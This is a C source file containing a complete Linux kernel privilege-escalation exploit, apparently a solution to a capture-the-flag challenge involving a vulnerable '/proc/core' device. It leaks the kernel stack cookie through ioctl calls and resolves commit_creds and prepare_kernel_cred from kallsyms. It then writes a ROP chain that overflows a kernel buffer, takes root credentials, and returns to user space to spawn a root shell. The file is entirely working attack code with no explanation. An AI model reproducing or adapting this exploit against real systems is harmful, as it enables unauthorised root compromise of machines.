#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

int core_fd;
uint64_t cookie;
uint64_t user_cs, user_ss, user_sp, user_rflags;
uint64_t vmlinux_base;
uint64_t commit_creds_addr, prepare_kernel_cred_addr;

// from checksec --file ./vmlinux
uint64_t raw_vmlinux_base = 0xffffffff81000000;

void set_off_val(uint64_t off) {
    ioctl(core_fd, 0x6677889c, off);
    printf("[*] Set off = 0x%lx\n", off);
}

void _core_read(void *buf) {
    ioctl(core_fd, 0x6677889b, buf);
    puts("[*] Read successfully");
}

void _core_copy_func(size_t sz) {
    ioctl(core_fd, 0x6677889a, sz | ((uint64_t)1 << 63));
    puts("[*] Copy successfully");
}

void _core_write(void *buf, size_t sz) {
    int n = write(core_fd, buf, sz);
    if (n < 0) {
        puts("[*] Failed to write");
        exit(EXIT_FAILURE);
    }
    puts("[*] Write successfully");
}

void open_dev(void) {
    core_fd = open("/proc/core", O_RDWR);
    if (core_fd < 0) {
        puts("[!] Failed to open device /proc/core");
        exit(EXIT_FAILURE);
    }
    puts("[*] /proc/core opened successfully");
}

void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
    puts("[*] User state saved");
}

void find_symbols() {
    char *ptr;
    // wc -L /tmp/kallsyms
    // 71
    char buf[0x100];
    FILE *fd = fopen("/tmp/kallsyms", "r");
    if (!fd) {
        printf("[!] Failed to open /tmp/kallsyms");
        exit(EXIT_FAILURE);
    }
    while (fscanf(fd, "%[^\n]\n", buf) != EOF) {
        if (commit_creds_addr && prepare_kernel_cred_addr) {
            return;
        }
        if (strstr(buf, "commit_creds")) {
            commit_creds_addr = strtoull(buf, &ptr, 16);
            printf("[*] commit_creds_addr @ 0x%lx\n", commit_creds_addr);
            continue;
        }
        if (strstr(buf, "prepare_kernel_cred")) {
            prepare_kernel_cred_addr = strtoull(buf, &ptr, 16);
            printf("[*] prepare_kernel_cred_addr @ 0x%lx\n",
                   prepare_kernel_cred_addr);
            continue;
        }
        memset(buf, 0, sizeof(buf));
    }
    puts("[!] Unable to find commit_creds_addr and prepare_kernel_cred_addr "
         "symbols addresses");
    exit(EXIT_FAILURE);
}

void spawn_shell() {
    if (!geteuid()) {
        puts("[*] Spawning root shell");
        system("/bin/sh");
    } else {
        printf("[!] Invalid euid = %u\n", geteuid());
        exit(EXIT_FAILURE);
    }
}

int main(void) {
    save_state();

    find_symbols();
    // use pwntools to find the symbol address offset
    uint64_t commit_creds_offset = 0x9c8e0;
    vmlinux_base = commit_creds_addr - commit_creds_offset;
    size_t offset = vmlinux_base - raw_vmlinux_base;
    size_t pop_rdi = 0xffffffff81000b2f + offset;
    size_t pop_rdx = 0xffffffff810a0f49 + offset;
    size_t mov_rdi_rax_jmp_rdx = 0xffffffff8106a6d2 + offset;
    size_t swapgs = 0xffffffff81a012da + offset;
    size_t iretq = 0xffffffff81050ac2 + offset;

    open_dev();
    set_off_val(8);
    uint64_t leak[8];
    _core_read(leak);
    cookie = leak[7];
    printf("[*] cookie = 0x%lx\n", cookie);
    uint64_t payload[0x30];
    size_t cookie_idx = 8;
    payload[cookie_idx++] = cookie;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = pop_rdi;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = prepare_kernel_cred_addr;
    payload[cookie_idx++] = pop_rdx;
    payload[cookie_idx++] = commit_creds_addr;
    payload[cookie_idx++] = mov_rdi_rax_jmp_rdx;
    payload[cookie_idx++] = swapgs;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = iretq;
    payload[cookie_idx++] = (uint64_t)spawn_shell;
    payload[cookie_idx++] = user_cs;
    payload[cookie_idx++] = user_rflags;
    payload[cookie_idx++] = user_sp;
    payload[cookie_idx++] = user_ss;
    _core_write(payload, sizeof(payload));
    _core_copy_func(sizeof(payload));
}
